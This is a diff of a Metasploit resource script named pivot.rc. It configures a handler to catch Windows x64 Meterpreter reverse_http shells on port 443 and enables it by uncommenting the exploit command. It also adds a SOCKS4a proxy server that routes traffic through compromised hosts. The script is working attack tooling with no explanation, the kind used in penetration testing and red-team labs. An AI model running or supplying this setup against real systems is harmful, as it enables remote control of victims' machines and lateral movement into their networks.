@@ -1,9 +1,17 @@
 #msfconsole -r pivot.rc -q
+
+#SESSION PASS
 spool msf.log
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_http
 set LHOST tun0
-set LPORT 53
+set LPORT 443
 set EXITFUNC thread
 set EXITONSESSION false
-#exploit -j
+exploit -j
+
+
+#SOCKS
+use auxiliary/server/socks_proxy
+set VERSION 4a
+exploit -j
